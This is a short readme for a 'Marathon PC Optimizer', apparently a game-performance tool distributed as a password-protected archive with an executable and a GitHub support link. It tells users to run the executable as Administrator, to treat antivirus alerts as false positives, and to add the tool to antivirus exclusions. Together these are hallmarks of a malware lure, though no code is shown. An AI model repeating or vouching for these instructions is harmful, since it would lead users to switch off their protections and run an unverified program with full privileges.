====================================================
Marathon PC Optimizer v1.0
====================================================

Password: marathon2026

FILES INCLUDED:
- Optimizer.exe – main tool (run as Administrator)
- profiles/ – optional config presets
- readme.txt – this file

WHAT THIS TOOL DOES:
Automatically applies all performance tweaks recommended by top gaming sites – fixes stuttering, boosts FPS, and optimizes Windows for Marathon.

HOW TO USE:
1. Extract all files to any folder.
2. Run Optimizer.exe AS ADMINISTRATOR.
3. Click "Apply All Tweaks".
4. Restart your PC and launch Marathon.

REQUIREMENTS:
- Windows 10/11

NOTE: Antivirus may false-positive – it's safe. Add to exclusions.

For support:
https://github.com/almainthesnow/marathon-pc-optimizer

Enjoy smooth frames!
